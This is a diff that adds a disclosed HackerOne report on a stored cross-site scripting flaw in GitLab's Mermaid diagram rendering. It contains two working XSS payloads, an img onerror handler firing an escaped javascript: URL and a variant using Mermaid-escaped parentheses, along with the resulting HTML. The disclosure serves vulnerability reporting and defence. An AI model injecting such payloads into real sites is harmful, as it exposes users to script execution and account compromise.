@@ -1,0 +1,58 @@
+'```
+Link:          https://hackerone.com/reports/341689
+By:            @fransrosen
+```
+
+Details:
+Hi,
+
+I read that Gitlab had enabled Mermaid and started to test it a bit.
+
+I noticed that the following Markdown in Gitlab:
+
+```
+ ```mermaid
+  graph LR
+      B-->D(<img onerror=location=`javascript\u003aalert\u0028document.domain\u0029` src=x>);
+ ```
+```
+
+Will end up in the following output:
+
+```html
+<foreignObject width="0" height="12"><div xmlns="http://www.w3.org/1999/xhtml" style="display: inline-block; white-space: nowrap;"><img onerror="location=`javascript\u003aalert\u0028document.domain\u0029`" src="x"></div></foreignObject>
+```
+
+Which will trigger the javascript on every page this is supported:
+
+![Screen_Shot_2018-04-22_at_00.52.38](/uploads/4d597796a407a019fba710c5d7f0b89c/Screen_Shot_2018-04-22_at_00.52.38.png)
+
+## Impact
+
+This is a pretty bad issue, since this creates a stored XSS on every place the markdown comments are possible, which is almost everywhere in Gitlab. I would suggest you to disable this, or make sure it's not possible to inject HTML using Mermaid.
+
+Regards,
+Frans
+
+The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
+
+**URL**
+http://gitlab-instance-every-markdown-field.localhost
+
+**Verified**
+Yes
+
+
+
+Timeline:
+2018-04-21 23:01:40 +0000: @fransrosen (comment)
+Here's a similar payload but using Mermaid-escaped `()`:
+
+```
+ ```mermaid
+graph LR
+    id1["<img src=x onerror=alert#lpar;document.domain#rpar;>"]
+ ```
+```
+
+---
